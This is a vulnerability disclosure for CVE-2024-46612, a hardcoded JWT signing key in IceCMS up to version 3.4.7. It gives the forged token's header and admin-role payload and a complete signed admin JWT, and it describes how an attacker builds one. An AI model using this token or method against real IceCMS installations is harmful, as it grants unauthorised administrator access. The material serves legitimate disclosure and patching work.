
**[CVE-ID]**

CVE-2024-46612

**[PRODUCT]**

icecms

**[Vendor of Product]**

https://github.com/Thecosy/iceCMS?tab=readme-ov-file

**[VERSION]**

icecms <=3.4.7

**[Vulnerability Type]**

Use of Hard-coded Credentials

**[Description]**

IceCMS v3.4.7 was discovered to contain a hardcoded JWT key, allowing an attacker to forge JWT authentication information.
 
JwtUtil.java

![pic1](/icecms/PIC/CVE-2024-46612-1.png)


Attackers can construct their own jwt authentication headers and edit them online through https://jwt.io/.
The "exp" is a timestamp.
```
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "username": "admin",
  "role": "admin",
  "sub": "3",
  "exp": 1727622963,
  "jti": ""
}
```
This is the jwt authentication information for the admin user:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwic3ViIjoiMyIsImV4cCI6MTcyNzYyMjk2MywianRpIjoiIn0.
bTps5cbUkX61R9aJAWgRrd57Ctsh8Uoo1VcJNJUOv-8
```
This is the forged jwt authentication information. When knowing the jwt key, it is exactly the same.
![pic2](/icecms/PIC/CVE-2024-46612-2.png)
